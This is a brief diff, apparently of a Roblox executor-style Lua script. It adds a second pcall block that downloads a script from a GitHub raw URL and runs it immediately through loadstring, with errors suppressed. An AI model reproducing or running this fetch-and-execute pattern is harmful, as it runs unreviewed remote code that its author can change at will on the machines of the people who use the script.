@@ -42,6 +42,9 @@ if targetFrame then
         pcall(function()
             loadstring(game:HttpGet("https://raw.githubusercontent.com/d00xy4b14n/2/refs/heads/main/2?v=" .. tick()))()
         end)
+        pcall(function()
+            loadstring(game:HttpGet("https://raw.githubusercontent.com/d00xy4b14n/b/refs/heads/main/b?v=" .. tick()))()
+        end)
     end)
 else
     warn("couldnt load.")
